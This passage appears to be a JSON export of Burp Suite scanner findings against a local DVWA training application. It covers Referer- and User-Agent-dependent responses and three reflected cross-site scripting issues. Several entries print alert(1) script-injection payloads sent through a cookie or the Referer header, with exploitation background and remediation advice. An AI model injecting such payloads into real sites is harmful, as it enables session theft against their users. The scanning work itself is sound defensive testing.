        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "35": {
        "\ufeffissue__serialNumber": "5.41597E+18",
        "issue__type": "4194592",
        "issue__name": "User agent-dependent response",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>\\n<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>\\n<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "36": {
        "\ufeffissue__serialNumber": "7.81642E+17",
        "issue__type": "4194560",
        "issue__name": "Referer-dependent response",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>\\n<p>Common explanations for Referer-dependent responses include: </p>\\n<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>\\n<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul>",
        "issue__remediationBackground": "<p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>\\n<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/213.html\">CWE-213: Intentional Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "37": {
        "\ufeffissue__serialNumber": "3.66205E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>cwzt4'&gt;&lt;script&gt;alert(1)&lt;/script&gt;htx9yg6au9i</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "38": {
        "\ufeffissue__serialNumber": "1.7036E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/javascript/",
        "issue__location": "/dvwa/vulnerabilities/javascript/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>qhf2i'&gt;&lt;script&gt;alert(1)&lt;/script&gt;pjg3u</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "39": {
        "\ufeffissue__serialNumber": "4.97435E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [Referer HTTP header]",
        "issue__severity": "Low",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>Referer</b> HTTP header is copied into the HTML document as plain text between tags. The payload <b>njsj6&lt;script&gt;alert(1)&lt;/script&gt;x709v</b> was submitted in the Referer HTTP header. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a request header, the application's behavior is not trivial to exploit in an attack against another user. In the past, methods have existed of using client-side technologies such as Flash to cause another user to make a request containing an arbitrary HTTP header. If you can use such a technique, you can probably leverage it to exploit the XSS flaw. This limitation partially mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
